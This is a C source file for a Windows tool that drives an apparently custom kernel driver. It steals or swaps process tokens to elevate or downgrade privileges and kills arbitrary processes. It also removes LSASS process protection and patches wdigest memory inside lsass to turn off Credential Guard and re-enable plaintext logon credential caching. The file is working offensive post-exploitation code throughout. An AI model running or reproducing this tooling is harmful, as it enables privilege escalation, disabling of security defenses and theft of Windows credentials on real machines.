#include "defs.h"
#include "ntoskrnl_dynamic_offset_res.h"
#include <tlhelp32.h>
#include <Psapi.h>


#define DEBUG 1

#if DEBUG
#define DEBUG_PRINT(fmt, ...) printf(fmt, __VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...) do {} while (0)
#endif

HANDLE hDevice;


DWORD find_pid_by_name(const wchar_t* proc_name) {
    if (!proc_name) return 0;

    HANDLE snapshot;
    PROCESSENTRY32W pe32;
    DWORD pid = 0;

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }

    do {
        if (_wcsicmp(proc_name, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32NextW(snapshot, &pe32));

    CloseHandle(snapshot);
    return pid;
}


BOOL modToken(DWORD32 target , DWORD32 toStealFrom){

    TASK_INFO tosend = { 0 };

    tosend.target = target;
    tosend.stealFrom = toStealFrom;

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_REPLACE_TOKEN,
        &tosend,
        sizeof(TASK_INFO),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {

        DEBUG_PRINT("[ERROR] Failed to modify token of process");
        return -1;
    }
}


BOOL kill(DWORD32 target) {
    TASK_INFO tosend = { 0 };

    tosend.target = target;

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KILL_PROCESS,
        &tosend,
        sizeof(TASK_INFO),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {

        DEBUG_PRINT("[ERROR] Failed to kill process");
        return -1;
    }
}

BOOL unprotectLsa(DWORD32 target, DWORD64 offset) {


    TASK_INFO tosend = { 0 };
    
    tosend.target = target;
    tosend.offset = offset;


    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_UNPROTECT_LSA,
        &tosend,
        sizeof(TASK_INFO),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {

        DEBUG_PRINT("[ERROR] Failed to unprotect lsass");
        return -1;
    }
}



void resolve_kstruct_offsets() {

    LoadNtoskrnlOffsetsFromInternet(TRUE);

    DEBUG_PRINT("[!] EPROCESS's Protection flag at offset %lu\n", g_ntoskrnlOffsets.st.eprocess_protection);

}


void help() {
    printf("Usage: Program.exe [options]\n\n");
    printf("Options:\n");
    printf("  -e <pid>    Elevate privileges of the specified PID. If PID is 0 , elevates current process.\n");
    printf("  -d <pid>    Downgrade privileges of the specified PID to match a low-integrity process (explorer.exe).\n");
    printf("  -k <pid>    Kill the process with the given PID.\n");
    printf("  -l          Unprotect LSASS (enables interaction or manipulation with LSASS).\n");
    printf("\nExamples:\n");
    printf("  Program.exe -e 1234           Elevate process 1234\n");
    printf("  Program.exe -d 5678           Downgrade process 5678\n");
    printf("  Program.exe -k 4321           Kill process 4321\n");
    printf("  Program.exe -l                Unprotect LSASS\n");
}


BOOL DisableCredGuard() {


    LoadWdigestOffsetsFromInternet(TRUE);
    if (g_wdigestOffsets.s.g_fParameter_UseLogonCredential) {
        DEBUG_PRINT("[!] Offset of g_fParameter_UseLogonCredential is %lu\n", g_wdigestOffsets.s.g_fParameter_UseLogonCredential);
    }
    else {
        DEBUG_PRINT("[-] Failed  to get offset of g_fParameter_UseLogonCredential\n");
    }

    if (g_wdigestOffsets.s.g_IsCredGuardEnabled) {
        DEBUG_PRINT("[!] Offset of g_IsCredGuardEnabled is %lu\n", g_wdigestOffsets.s.g_IsCredGuardEnabled);
    }
    else {
        DEBUG_PRINT("[-] Failed  to get offset of g_IsCredGuardEnabled\n");
    }


    DWORD lsassPid = 0;
    HANDLE hLsass = INVALID_HANDLE_VALUE;



    lsassPid = find_pid_by_name(L"lsass.exe");


    if (0 != lsassPid)
    {
        HANDLE hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
        if (INVALID_HANDLE_VALUE != hLsass && hLsass != NULL)
        {
            HMODULE hArray[256];
            DWORD fak;
            EnumProcessModules(hLsass, hArray, sizeof(hArray), &fak);

            char szFilename[256];

            for (unsigned int i = 0; i < (fak / sizeof(HMODULE)); i++)
            {
                GetModuleFileNameExA(hLsass, hArray[i], szFilename, 256);
                if (strstr(szFilename, "wdigest"))
                {

                    MODULEINFO moduleInfo;

                    if (GetModuleInformation(hLsass, hArray[i], &moduleInfo, sizeof(MODULEINFO)))
                    {
                        unsigned char* ptr = (unsigned char*)moduleInfo.lpBaseOfDll;

                        //Locations of each variable
                        LPVOID addrOfUseLogonCredentialGlobalVariable = ptr + g_wdigestOffsets.s.g_fParameter_UseLogonCredential;
                        LPVOID addrOfCredGuardEnabled = ptr + g_wdigestOffsets.s.g_IsCredGuardEnabled;

                        DWORD dwCurrent = 0xAABBCCDD;
                        DWORD dwCurrentLength = sizeof(DWORD);
                        SIZE_T bytesRead = 0;

                        DWORD oldProtect, newProtect;

                        if (ReadProcessMemory(hLsass, addrOfUseLogonCredentialGlobalVariable, &dwCurrent, dwCurrentLength, &bytesRead))
                        {
                            DEBUG_PRINT("\t(1) dwCurrent= %d for g_fParameter_UseLogonCredential\n", dwCurrent, bytesRead);
                        }
                        else {
                            DEBUG_PRINT("(1) Failed to read memory address for g_fParameter_UseLogonCredential\n");
                            return FALSE;
                        }
                            
                        //Set g_fParameter_UseLogonCredential to 1
                        DWORD dwUseLogonCredential = 1;
                        SIZE_T bytesWritten = 0;

                        if (!WriteProcessMemory(hLsass, addrOfUseLogonCredentialGlobalVariable, (PVOID)&dwUseLogonCredential, sizeof(DWORD), &bytesWritten))
                        {
                            CloseHandle(hLsass);
                            DEBUG_PRINT("Failed at WriteMemory for g_fParameter_UseLogonCredential. Error %d \n", GetLastError());

                            return FALSE;
                        }

                        if (ReadProcessMemory(hLsass, addrOfUseLogonCredentialGlobalVariable, &dwCurrent, dwCurrentLength, &bytesRead))
                        {
                            DEBUG_PRINT("\t(2) dwCurrent= %d for g_fParameter_UseLogonCredential\n", dwCurrent, bytesRead);
                        }


                        if (!VirtualProtectEx(hLsass, addrOfCredGuardEnabled, sizeof(DWORD), PAGE_READWRITE, &oldProtect))
                        {
                            CloseHandle(hLsass);
                            DEBUG_PRINT("(1) Failed at virtual protect for g_IsCredGuardEnabled. Error %d \n", GetLastError());
                            return FALSE;
                        }
                        if (ReadProcessMemory(hLsass, addrOfCredGuardEnabled, &dwCurrent, dwCurrentLength, &bytesRead))
                        {
                            printf("\t(1) dwCurrent= %d for g_IsCredGuardEnabled\n", dwCurrent, bytesRead);
                        }
                        else {
                            DEBUG_PRINT("(1) Failed to read memory address for g_IsCredGuardEnabled\n");
                            return FALSE;
                        }
                            

                        DWORD dwCredGuard = 0;

                        if (!WriteProcessMemory(hLsass, addrOfCredGuardEnabled, (PVOID)&dwCredGuard, sizeof(DWORD), &bytesWritten))
                        {
                            CloseHandle(hLsass);
                            DEBUG_PRINT("Failed at WriteMemory for g_IsCredGuardEnabled. Error %d \n", GetLastError());
                            return FALSE;
                        }

                        if (ReadProcessMemory(hLsass, addrOfCredGuardEnabled, &dwCurrent, dwCurrentLength, &bytesRead))
                        {
                            DEBUG_PRINT("\t(2) dwCurrent= %d for g_IsCredGuardEnabled\n", dwCurrent, bytesRead);
                        }

                        if (!VirtualProtectEx(hLsass, addrOfCredGuardEnabled, sizeof(DWORD), oldProtect, &newProtect))
                        {
                            CloseHandle(hLsass);
                            DEBUG_PRINT("(2) Failed at virtual protect for g_IsCredGuardEnabled. Error %d \n", GetLastError());
                            return FALSE;
                        }
                        //End creadGuard Patch 
                        CloseHandle(hLsass);
                        DEBUG_PRINT("Success\n");
                        return TRUE;
                    }
                }
            }
        }
        else
        {
            DEBUG_PRINT("Failed, bad lsass handle\n");
            return FALSE;
        }


    }

    return FALSE;


}




int main(int argc, char** argv)
{

    
    if (argc == 1) {
        help();
        return -1;
    }
    if (argc == 2 && (strcmp(argv[1], "-h") == 0)) {

        help();
        return -1;
    }


    char* elevate = NULL;
    char* downgrade = NULL;
    char* tokill = NULL;
    int lsass_unprotect = 0;
    int credGuard = 0;

    for (int i = 1; i < argc; i++) {

        if (strcmp(argv[i], "-h") == 0) {
            continue;
        }
        else if (strcmp(argv[i], "-e") == 0) {
            if (i + 1 < argc) {
                elevate = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -e requires an argument\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-d") == 0) {
            if (i + 1 < argc) {
                downgrade = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -d requires an argument\n");
                return 1;
            }
        }

        else if (strcmp(argv[i], "-k") == 0) {
            if (i + 1 < argc) {
                tokill = argv[++i];
            }
            else {
                fprintf(stderr, "Error: -k requires an argument\n");
                return 1;
            }
        }
        else if (strcmp(argv[i], "-l") == 0) {
            lsass_unprotect = 1;
        }
        else if (strcmp(argv[i], "-credGuard") == 0) {
            credGuard = 1;
        }
        else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            return 1;
        }
    }



    hDevice = CreateFile(L"\\\\.\\internalsRaccoon", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        DEBUG_PRINT("Failed to open device. Error: %d\n", GetLastError());
        return 1;
    }



    if (elevate) {
        DWORD32 targetPid = (DWORD32)atoi(elevate);
        if (targetPid == 0) {
            targetPid = (DWORD32)GetCurrentProcessId();
        }
        DEBUG_PRINT("Elevating %lu\n", targetPid);
        modToken(targetPid, NULL);
    }


    if (downgrade) {
        DWORD32 targetPid = (DWORD32)atoi(downgrade);
        DWORD32 lowPid = (DWORD32)find_pid_by_name(L"explorer.exe");
        if (lowPid != 0) {
            DEBUG_PRINT("Downgrading %lu\n", targetPid);
            modToken(targetPid, lowPid);
        }
        else {
            DEBUG_PRINT("[-] Failed to find low integrity process for downgrade\n");
        }        
    }

    if (tokill) {
        DWORD32 targetPid = (DWORD32)atoi(tokill);
        DEBUG_PRINT("Killing %lu\n", targetPid);
        kill(targetPid);
    }

    if (lsass_unprotect) {
        DWORD32 lsass = (DWORD32)find_pid_by_name(L"lsass.exe");
        resolve_kstruct_offsets();
        DWORD64 offset = g_ntoskrnlOffsets.st.eprocess_protection;
        if (lsass != 0 && offset) {
            DEBUG_PRINT("Unprotecting LSASS...\n");
            unprotectLsa(lsass, offset);
        }
        else {
            DEBUG_PRINT("[-] Failed to find LSASS.exe\n");
        }
        
    }

    if (credGuard) {
        if (DisableCredGuard()) {
            DEBUG_PRINT("[+] Credential Guard disabled\n");
        }
        else {
            DEBUG_PRINT("[-] Error Disabling Credential Guard\n");
        }
    }


    





    return 0;

}

